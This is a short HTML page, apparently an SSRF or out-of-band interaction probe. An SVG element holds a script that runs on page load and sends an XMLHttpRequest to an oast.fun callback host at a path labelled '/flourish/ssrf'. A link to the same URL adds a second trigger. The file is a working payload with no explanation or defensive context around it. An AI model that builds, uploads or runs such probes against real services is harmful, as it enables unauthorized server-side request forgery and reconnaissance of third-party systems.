<!DOCTYPE html>
<html>
<head>
  <title>SVG with XMLHttpRequest</title>
  <style>
    #svg-container {
      width: 200px;
      height: 200px;
    }
  </style>
</head>
<body>
  <a href="https://cfgbvm62vtc0000dvwn0g8af74hyyyyyb.oast.fun/flourish/ssrf">hreef</a>
  <h1>SVG with XMLHttpRequest</h1>
  <div id="svg-container">
    <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
      <script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function() {
          var xhr = new XMLHttpRequest();
          xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
              var response = xhr.responseText;
              console.log(response);
            }
          };
          xhr.open("GET", "https://cfgbvm62vtc0000dvwn0g8af74hyyyyyb.oast.fun/flourish/ssrf", true);
          xhr.send();
        });
      </script>
      <rect width="200" height="200" fill="lightblue" />
    </svg>
  </div>
</body>
</html>
